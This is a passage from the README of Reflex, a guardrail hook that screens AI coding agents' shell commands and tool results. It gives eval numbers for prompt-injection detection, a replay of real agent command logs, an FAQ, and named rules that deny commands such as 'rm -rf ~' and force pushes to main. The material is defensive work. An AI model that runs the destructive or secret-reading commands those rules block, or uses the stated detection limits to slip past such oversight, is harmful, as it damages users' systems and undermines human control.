| Tool gate, 171 commands | 171 as labelled, 0 MISS, 0 over-strict; 6 of 7 allow-eligible cases allowed | 151 as labelled, 1 MISS (a deny softened to ask), 19 over-strict | `npm run eval` ([GUIDE: golden set](docs/GUIDE.md#3-golden-set-on-every-change-to-questions-policy-or-rules)) |
| Prompt injection, 62 results (33 injections, 29 benign) | 62 of 62 exact outcomes, precision 97 %, recall 100 %, 0 high-severity missed | precision 81 %, recall 79 %, 7 high-severity missed | `npm run eval-injection` ([GUIDE: injection guard](docs/GUIDE.md#injection-guard)) |
| Escalation ladder, 41 commands | 41 of 41 resolved as labelled, 0 unsafe approvals, 26.8 human interventions and 19.5 System 2 calls per 100 commands | 0 unsafe approvals, 34.1 human interventions and 36.6 System 2 calls per 100 commands | `npm run eval-ladder` ([GUIDE: ladder metrics](docs/GUIDE.md#metrics-1)) |

The tool gate set has since grown to 183 cases (applies without a readable plan, among others);
those were not part of the live run above, so the 171-case numbers are the latest measured ones.
A MISS is a risky command that got a softer outcome than labelled. The ladder eval uses a System 2
stub that approves everything, so only the rules, System 1 and the always-human class stand between
an escalated command and running.

**System 2 cost per call** (the `claude` CLI, measured on Claude Code 2.1.282 with a subscription
login, [GUIDE: System 2](docs/GUIDE.md#system-2)):

| `claude -p` call | Input tokens | Cost at API prices | Time |
|---|---|---|---|
| naive: default model, CLAUDE.md, tools, skills | 36,826 | $0.28 | 7.3 s |
| Reflex's lean flags, `--model sonnet`, first call | about 3,100 | $0.016 | 3 to 4 s |
| the same, repeated (the prefix is a cache read) | about 3,100, mostly cached | $0.004 to $0.005 | 3 to 4 s |

On an API backend the case System 2 gets is about 500 tokens (512 in the ladder eval above, capped
at 1,500) and the verdict about 22 tokens.

**Jev vs Laya, head to head** (same code, same cases, same hour; Laya 0.3.20 on an Apple M5 Max;
[GUIDE: measured against Jev](docs/GUIDE.md#measured-against-jev), run with `npm run eval-compare`):

| Golden set | Jev 1.13.0 | Laya `typed-decisions` (raw, the default) | Laya `english` (raw) |
|---|---|---|---|
| Tool gate (97): ok, MISS, over | 97, 0, 0 | 64, 0, 33 | 64, 0, 33 |
| Injection guard (62): precision, recall, high-severity missed | 97 %, 100 %, 0 | 54 %, 100 %, 0 | 64 %, 85 %, 5 |
| Ladder (41): unsafe, System 1 denies | 0, 10 | 0, 30 | 0, 31 |
| Instructions (20): exact | 20 | 2 | 3 |
| Model routing (27): sensitivity correct, leaks | 27, 0 | 7, 0 | 8, 0 |
| Tool router (15): ok, unsafe | 14, 0 | 1, 0 | 1, 0 |
| Tool gate latency p50 per call | 300 to 330 ms (network) | 125 ms (local, MPS) | not reported |

Raw `typed-decisions` has no safety failure, but gets there by denying or flagging most things;
calibrated Laya checkpoints miss a deny Jev catches. Jev stays the recommendation for every
decision. The GUIDE has the full table, including `multilingual` and calibrated runs.

## Replay: what it would have done on a real week

Golden sets are small and hand-labelled. To see what Reflex does on real work, `reflex replay`
runs the shell commands already in your local Claude Code, Codex, opencode or pi transcripts
through the gate, the same way the Claude Code hooks and Codex hooks would. It executes nothing
and writes nothing. Here is one DevOps and GenAI engineer's last 7 days, local engine, Reflex
v0.9.0:

| | Claude Code | Codex |
|---|---|---|
| Shell commands the agent ran | 13,743 | 700 |
| Passed as read-only or fast lane, no API call | 7,066 (51 %) | 517 (74 %) |
| Asked by a rule | 597 | 5 |
| Denied by a rule | 32 | 0 |
| Left to the engine | 6,048 | 178 |
| Would reach a human per 100 commands (keyless, supervised) | 48.4 | 26.1 |
| Estimated cost to send the rest to Jev | about $0.47 | about $0.01 |

With the local engine every command a rule does not settle goes to a person, so the last rows
are the upper bound for a human in the loop. With Jev or System 2 answering most of them,
autonomous coding agents get fewer permission prompts.

The rules that fired most on Claude Code were `tamper` (531), `secret-exfil` (27), `secret-read`
(18), `force-push-main` (17), `secret-file-read` (16) and `rm-root` (11). 524 of the 531 `tamper`
hits ran inside a Reflex checkout while Reflex itself was being developed (edits to the gate,
`REFLEX_*` variables set for test runs), which is the rule doing its job; outside that checkout
it fired 7 times. Not every hit was right. The replay found `secret-file-read` reading the jq
filter `.env` as a `.env` file, `secret-read` counting a keychain lookup whose output goes to
`/dev/null` as printing the key, and reads through `/usr/bin/grep` or `/usr/bin/git` missing the
fast path. Those are fixed for the next release, which on the same week brings Claude Code to
7,973 commands passed without an API call (58 %) and 41.8 per 100 reaching a human; Codex is
unchanged. What remains are rules matching test strings inside `python3 - <<EOF` programs and
`node -e` scripts that carry a dangerous command as data (`rm-root`, `force-push-main`,
`secret-exfil`). Those stay: the text could run, and an ask costs less than a miss. Replay is how
these AI coding agent guardrails are tuned. Run it on your own history before you switch to
enforce mode:

```bash
reflex replay claude --since 7d
reflex replay codex --since 7d --json
```

## Compared with other AI coding agent guardrails

Reflex is a hook, not a sandbox. It decides per command, using what the command is and where it
points; a sandbox limits what any command can reach. The two work together.

| Approach | What it does | Where it is better than Reflex | What Reflex adds |
|---|---|---|---|
| Claude Code permission prompts and allowlists (`allow` / `ask` / `deny` rules) | Prefix and pattern rules per tool, a prompt for everything else | Built in, no latency, covers file edits, web fetches and MCP tools, which Reflex does not gate | Judges commands the rules do not list, reads the scripts they run, knows the AWS profile and kube context. Reflex only tightens by default, so your rules keep working. |
| `--dangerously-skip-permissions` / YOLO mode | No prompts at all | Fastest, no interruptions | Rule denies still apply, and in the autonomous profile the approval queue parks what needs a human (returned to the agent as a deny, so the run continues) |
| Container or devcontainer sandbox | Isolates the filesystem, processes and optionally the network | Hard OS-level containment of local damage, whatever the command | Mounted cloud credentials, kube configs and SSH keys still reach production from inside a container. Reflex judges those commands, and scans what the agent reads. |
| Codex sandbox modes (`read-only`, `workspace-write`, `danger-full-access`) and approval policies | OS sandbox for the commands Codex runs, with network off by default in `workspace-write` | Enforced by the OS; no pattern can be bypassed by an unusual shell construct | Context-aware blocking inside `workspace-write` or `danger-full-access` (cloud profile, kube context, the scripts a command runs). It cannot approve anything: Codex's approval policy still decides. Codex hooks cannot show a prompt, so a Reflex `ask` blocks and the human runs the command with `reflex run`. |
| [abide](https://github.com/coldteadotai/abide) | Enforces your `AGENTS.md` / project rules on each edit and on the turn's diff, using Jev | Checks code the agent writes against your conventions, which Reflex does not do | Complementary: abide checks edits after they happen; Reflex gates shell commands and tool results before execution. Both can run on the same agent. |
| Generic LLM-as-judge hooks | Send each command to a general LLM for a verdict | Any model, free-form reasoning, simple to write | Rules, the read-only list and the fast lane settle about half of commands (51 % on one engineer's week of Claude Code in the replay above) with no API call; the rest cost one typed Jev request (about 1k tokens); a stronger model is asked only on escalation, with budgets, caps and a cache; a policy file makes decisions replayable and tunable. |

For infra work, the difference by capability:

| Capability | Built-in agent permissions (Claude Code, Codex) | Container or OS sandbox | Reflex |
|---|---|---|---|
| Plan-aware terraform | A prefix rule can ask on `terraform apply`; the plan is not read | Not in scope | Asks for a saved plan; with `infra.terraform_show` and a plugin cache, denies a plan that deletes or replaces |
| Production context | Rules match the command text only | Limits what a command can reach, not which account or cluster it targets | AWS profile, kube context, Terraform workspace, git branch and prod paths in every decision |
| Change freeze | Not built in | Not built in | Time or date windows that ask or deny production commands, from `config.json` or the team policy |
| Audit export | Each agent's own logs and telemetry, in its own format | Not in scope | `reflex audit`: one csv, json or jsonl row per decision for SOC 2 and ISO 27001 evidence, plus a webhook |
| Cross-agent policy | Each agent's own settings files, in that agent's format | Per container image | One committed `.reflex/policy.json` applied in Claude Code, Codex CLI, opencode, pi and Hermes |

Keep IAM, network controls and least-privilege credentials, and use Reflex for the decisions a
sandbox cannot make.

## Supported agents: Claude Code hooks, Codex hooks and more

| Agent | Hook | How `ask` is shown |
|---|---|---|
| Claude Code | `PreToolUse` | Claude Code permission prompt |
| Codex CLI | `PreToolUse` | Blocked; human uses `reflex run` in their own terminal |
| pi, oh-my-pi | extension `tool_call` | Native confirm dialog |
| opencode | plugin `tool.execute.before` | Blocked; human uses `reflex run` in their own terminal |
| Hermes | `pre_tool_call` | Hermes approval prompt |
| Other | `scripts/reflex-sh` as the shell | y/N on the terminal |

The injection guard reads tool results and prompts through each agent's own hooks, so what it can do
differs:

| Agent | Tool results | Prompts with a pasted credential |
|---|---|---|
| Claude Code | `PostToolUse` on web, MCP, `Read` and `Bash`: warn adds a note, block rewrites the result | `UserPromptSubmit`: blocked, reason shown |
| Codex CLI | `PostToolUse` on `Bash` and MCP tools: warn adds a note, block replaces the result with the reason and the cleaned text; web search is not hookable | `UserPromptSubmit`: blocked, reason shown |
| pi, oh-my-pi | extension `tool_result`: block rewrites the result, warn appends a note | extension `input`: dropped with a notification |
| opencode | plugin `tool.execute.after`: block rewrites the result, warn appends a note | `chat.message`: stopped with an error |
| Hermes | `post_tool_call` is observe-only: logged, and the note reaches the model on the next turn | cannot block; the model is told not to repeat it |
| Other | not covered | not covered |

Coverage is agent shell tools, subagent spawns (for dedup) and the optional router's own calls.
File-edit tools and MCP tool calls go through each agent's own permissions. Hosts without hooks (Claude Desktop, Cursor) get
the [MCP server](docs/GUIDE.md#reflex-mcp-server-ask-before-acting-claude-desktop-cursor-cowork), which advises and does not enforce. Doctor cannot prove host
trust or verify a native approval dialog; run a harmless command in a fresh agent session and check
`reflex status`. Plain chat confirmation does not unblock a Codex or opencode hook. See
[docs/SETUP.md](docs/SETUP.md) for manual steps and limits.

## Cost and latency

- The local engine never calls TypeSafe. Read-only, rule and fast-lane commands need no API call in
  any engine.
- A Jev call is about 1k input tokens (49,533 for the 45 Jev calls of the tool gate eval) and took
  0.35 to 0.42 s in the scenarios above (the GUIDE's figure is about 0.7 s in enforce mode).
- With Jev in shadow mode, classification runs in a detached background process, so the agent does
  not wait for it.
- Identical commands in the same context are cached for 24 hours.
- TypeSafe publishes no price list. Replay estimates Jev spend at $0.04 per million input tokens,
  which matches a public third-party measurement; set `REFLEX_JEV_USD_PER_MTOK` to your price.
- The Laya engine costs nothing per call and keeps about 1.4 GB resident on an M5 Max (2.2 GB on
  CPU); on a CPU-only machine it can exceed the gate's 3 s budget and fall back to ask.

## Limits

- Rules are pattern matching, not a shell parser. The read-only pass is a shell parser by
  default (`"readonly": "legacy"`), or with `"readonly": "simple"` an allowlist of programs and
  flags over plain words (commands and pipelines joined by `;`, `&&` or `||`, no `$`, globs or redirects).
  They are designed to fail towards asking, and the self-checks pin known bypasses, but treat them
  as a strong filter.
- Only shell tools (and subagent spawns) are gated. File edits, MCP calls, omp's `eval` and Hermes'
  `execute_code` are not.
- The injection guard is a heuristic filter. An injection phrased as ordinary prose passes the local
  detectors; Jev is there for that.
- Scripts are read when the hook runs, not when the command runs.
- Keyless, nothing classifies the environment or exfiltration beyond the rules; use a TypeSafe key
  for production-adjacent work.

The full list: [GUIDE: safety properties and limits](docs/GUIDE.md#safety-properties-and-limits),
[SECURITY.md](SECURITY.md).

## FAQ

Short answers; the full list of 30 questions is in [docs/FAQ.md](docs/FAQ.md).

### How do I stop Claude Code from running dangerous commands?

Install Reflex (`npx @ursuciprian/reflex setup`), which adds a Claude Code `PreToolUse` hook that
checks every Bash command before it runs. Its rules deny `rm -rf ~`, destructive operations on
production and force pushes to `main`, and ask before reads of private keys and credential files,
in shadow mode too. After a shadow period, `reflex setup --mode enforce` also puts the engine's
judgments in front of the agent. See the [real-world scenarios](#real-world-scenarios-with-outputs).

### Can Reflex block destructive MCP tool calls?

Yes. The same `PreToolUse` hook judges MCP tool calls (`mcp__<server>__<tool>`): a destructive verb
in the tool name, a scale to zero, an IAM, bucket policy or security group change, destructive SQL
or an HTTP DELETE asks, and is denied when the arguments or the server point at production. Reads
pass without a prompt. See [Gate MCP tool calls](docs/GUIDE.md#gate-mcp-tool-calls).

### How does Reflex handle terraform apply?

An apply without a saved plan file asks, in shadow and enforce mode, and tells the agent to run
`terraform plan -out=tfplan` and apply that file (`infra.require_plan_in_prod` makes it a deny in
production). With `infra.terraform_show` on, Reflex reads the saved plan with `terraform show -json`
in the command's directory and counts creates, updates, deletes and replaces: any delete or replace
is denied, with stateful resources such as `aws_db_instance` named first, and a clean plan still asks
in production. It needs a provider plugin cache: `terraform show` starts the provider binaries in
`.terraform`, so the hook runs it only when every provider there is a symlink into your cache. The
hook never runs `plan` or `apply` itself. See
[GUIDE: plan-aware terraform gate](docs/GUIDE.md#plan-aware-terraform-gate-stop-ai-agents-from-destroying-infrastructure).

### Does Reflex support OpenTofu, Terragrunt and helm?

Yes. For an OpenTofu AI agent, `tofu apply <planfile>` is read with `tofu show -json` under the
same rules as terraform (`infra.terraform_show`, the plugin cache check, a 3 s timeout that asks),
and `tofu apply` without a plan asks with the fix. Terragrunt guardrails: every `terragrunt apply`,
`run-all apply` or `run --all apply` asks, and `run-all destroy` is denied in production. For helm,
`helm uninstall`, `helm delete` and `helm rollback` ask and are denied in a production kube context
or namespace, a production `helm upgrade --install` asks with the release and namespace, and
`infra.helm_diff` adds a `helm diff` count of changed and removed objects. See
[GUIDE: OpenTofu and Terragrunt](docs/GUIDE.md#opentofu-and-terragrunt) and
[GUIDE: helm guardrails](docs/GUIDE.md#helm-guardrails-for-ai-agents).

### Can Reflex prevent an AI agent's terraform destroy in Claude Code or Codex?

Yes. `terraform destroy`, `apply -destroy` and `apply -replace=` hit the destroy rules: they ask, and
are denied in production (a prod working directory, AWS profile, kube context, Terraform workspace
or git branch, or a prod name in the command such as `-chdir=envs/prod`). A team policy's `prod`
markers make them ask, not deny. Rule outcomes hold in shadow mode too, and in the autonomous profile no model can approve
them. See [real-world scenarios](#real-world-scenarios-with-outputs).

### How is Reflex different from Claude Code permission prompts and allowlists?

Claude Code's permission rules match tools and command prefixes; Reflex judges each shell command
by what it does, the scripts it runs and where it points (AWS profile, kube context, Terraform
workspace, git branch). By default it only adds `ask` or `deny`, so your allowlist keeps working.
Claude Code's rules also cover file edits, web fetches and MCP tools, which Reflex does not gate.
See the [comparison with other guardrails](#compared-with-other-ai-coding-agent-guardrails).

### What guardrails can I add to Codex CLI?

Reflex installs Codex hooks that judge each Bash command inside the sandbox mode and approval
policy Codex already uses, and scan Bash and MCP results for prompt injection. Codex hooks cannot
show a prompt, so a Reflex `ask` blocks and the human runs the command with `reflex run` in their
own terminal. Trust the hooks once in Codex's `/hooks`. Install it as a Codex CLI plugin
(`codex plugin marketplace add ursuciprian/reflex`, then `codex plugin add reflex@reflex`) or with
`reflex setup --agent codex`. See
[supported agents](#supported-agents-claude-code-hooks-codex-hooks-and-more).

### Is there an opencode plugin?

Yes. Add `"plugin": ["@ursuciprian/reflex"]` to `~/.config/opencode/opencode.json` and opencode
installs it from npm at its next start, or run `reflex setup --agent opencode` to write the same
plugin into `~/.config/opencode/plugins/reflex.js`. With both, only the setup file gates. See
[docs/SETUP.md: opencode plugin](docs/SETUP.md#opencode-plugin).

### Does Reflex work in Claude Desktop or Cursor?

Yes, as advice, not as a gate. Claude Desktop and Cursor have no pre-execution hook Reflex can
install, so Reflex runs there as an MCP server for AI agent safety: `reflex mcp` (or
`npx -y @ursuciprian/reflex mcp` in the host's MCP config) gives the agent `reflex_check`,
`reflex_scan`, `reflex_status`, `reflex_audit` and `reflex_explain`. The agent can ask what the gate
decides for a command (`git push --force origin main` is `deny`, rule `force-push-main`) or screen a
fetched page for prompt injection before it acts. These Claude Desktop guardrails depend on the model
calling the tool and following the answer: an MCP server cannot stop a client from running a command.
The tools are read-only, never change Reflex's configuration and redact what they return. Where the
agent has hooks (Claude Code, Codex CLI, opencode, pi, Hermes), the hooks enforce and the MCP tools
are an extra check.
See [GUIDE: Reflex MCP server](docs/GUIDE.md#reflex-mcp-server-ask-before-acting-claude-desktop-cursor-cowork).

### Does Reflex need an API key, an account or LiteLLM?

No. New installs use the local engine, with no account, no key and no network calls. A TypeSafe API
key is only for the optional Jev engine, Laya runs on 127.0.0.1 with no key, and LiteLLM is only
for the optional model routing hook. See
[docs/SETUP.md: start locally](docs/SETUP.md#1-start-locally-or-enable-hosted-classification).

### Do I need a TypeSafe account?

No. The local engine needs no account at all. For Jev, a TypeSafe key is one option; an OpenRouter
key, a Cloudflare API token with its account id, a Vercel AI Gateway key or a compatible endpoint
work too, with the same questions, the same policy and the same fail-closed handling:

```bash
export OPENROUTER_API_KEY=sk-or-...     # or CLOUDFLARE_API_TOKEN + CLOUDFLARE_ACCOUNT_ID, or AI_GATEWAY_API_KEY
reflex setup --provider openrouter      # named once: a key set for another tool never picks a provider on its own
reflex doctor                           # System 1: Jev via openrouter (openrouter.ai) + policy
```

Each key goes only to its own provider's host, and that provider is then a place your data goes
(it passes the request on to TypeSafe). See
[GUIDE: use Jev through OpenRouter, Cloudflare or Vercel](docs/GUIDE.md#use-jev-through-openrouter-cloudflare-or-vercel).

### What is TypeSafe Jev, and how does it compare with Laya?

Jev is TypeSafe's small System One model: it answers typed questions (probabilities, scores,
choices), and Reflex asks it six per uncovered command, then applies your `policy.json`. Laya is an
experimental local model that answers the same questions on your machine for free, and measured
below Jev on every golden set; use Jev (or the local engine) for enforcement. See
[measured results](#measured-results).

### How much does it cost, and how much latency does it add?

Reflex is free (MIT), and the local and Laya engines cost nothing per call. A Jev call is about 1k
input tokens and took 0.35 to 0.42 s in the scenarios above; replay estimated about $0.47 to send
Jev the commands the rules left open in a week of 13,743 Claude Code commands. Read-only, rule and
fast-lane commands make no API call, and in shadow mode Jev runs in the background. See
[cost and latency](#cost-and-latency).

### Does Reflex send my code anywhere?

Not with the default local engine. With Jev, a command the rules leave open sends TypeSafe (or the
OpenRouter, Cloudflare, Vercel or compatible provider you chose, which passes it on to TypeSafe) the
redacted command, the working directory, environment names, the agent's last message and last five
commands, and the first 16 KB of a local script it runs, never a credentials file. The injection
guard also sends redacted excerpts of inspected tool results, and optional features such as
conditional instructions send their own redacted context. Details:
[GUIDE: data handling](docs/GUIDE.md#data-handling).

### What happens when Jev is down?

The policy's fallback applies, which is `ask`: in enforce mode (supervised profile) a human
reviews the command. Rules, the read-only list and the fast lane keep working locally, and in
shadow mode the agent is not affected. See
[GUIDE: safety properties and limits](docs/GUIDE.md#safety-properties-and-limits).

### Does Reflex protect against prompt injection?

Yes, as a filter: it scans web pages, MCP results, files from other projects and network command
output for text written to steer the agent, and in enforce mode warns, removes the text and makes
the session stricter. On a 62-case golden set Jev reached 97 % precision and 100 % recall, the
local detectors 81 % and 79 %. See [GUIDE: injection guard](docs/GUIDE.md#injection-guard).

### Can it approve agent commands automatically but safely?

Yes, in three opt-in ways. `reflex suggest` proposes project-scoped fast-lane entries for the
build, test and lint commands your agents keep asking about (`reflex learn` does the same from the
commands you approved yourself), and calibrated allow (`--allow on`,
Jev engine, enforce mode) lets commands Jev judges clearly safe skip Claude Code's permission
prompt; neither touches rule outcomes. The autonomous profile adds System 2 and an approval queue for agents with
no human watching; on its 41-command golden set it made 0 unsafe approvals. See
[GUIDE: suggest fewer permission prompts](docs/GUIDE.md#suggest-fewer-permission-prompts),
[GUIDE: calibrated allow](docs/GUIDE.md#calibrated-allow) and
[GUIDE: autonomous agents](docs/GUIDE.md#autonomous-agents).

### How do I try it safely?

New installs run in shadow mode: rules still block, everything else is logged. `reflex replay all
--since 7d` shows what Reflex would have done with your past sessions, and executes and writes
nothing. See [replay on a real week](#replay-what-it-would-have-done-on-a-real-week).

### How do I uninstall Reflex?

`reflex uninstall` removes the hooks (for Hermes it prints what to delete from `config.yaml`), the
package and the `reflex` link, and keeps your settings, policy and logs. Delete the logs with
`rm -rf ~/.local/state/reflex`. See [docs/SETUP.md: uninstall](docs/SETUP.md#uninstall).

## Documentation

- [ursuciprian.github.io/reflex](https://ursuciprian.github.io/reflex/): these docs as a website, with a page per topic
- [GitHub Action](docs/SETUP.md#github-action-check-the-team-policy-and-commands-in-ci): validate `.reflex/policy.json` and fail CI when a listed command is denied
- [examples/policies/](examples/policies/): policy packs for AWS, EKS, Terraform and a startup default
- [docs/FAQ.md](docs/FAQ.md): questions and answers about Reflex, Jev, Laya, cost, data and rollout
- [docs/SETUP.md](docs/SETUP.md): installation, configuration, per-agent setup, uninstalling
- [docs/GUIDE.md](docs/GUIDE.md): design, testing, tuning, rollout, metrics, data handling, limits
- [llms.txt](llms.txt) and [llms-full.txt](llms-full.txt): a summary of this project for language models
- [SECURITY.md](SECURITY.md): reporting vulnerabilities, known limits
- [CONTRIBUTING.md](CONTRIBUTING.md): development, tests, repository layout
- [CHANGELOG.md](CHANGELOG.md): release notes for every version

## Development

```sh
git clone https://github.com/ursuciprian/reflex.git && cd reflex
npm test                        # offline self-checks
npm run eval                    # tool gate golden set against the live API (needs a key)
npm run eval-injection          # injection golden set against the live API
npm run eval-ladder             # escalation ladder; add -- --engine local to run it offline
node install.mjs --agent all    # hook this checkout into your agents
```

## License

[MIT License](LICENSE)
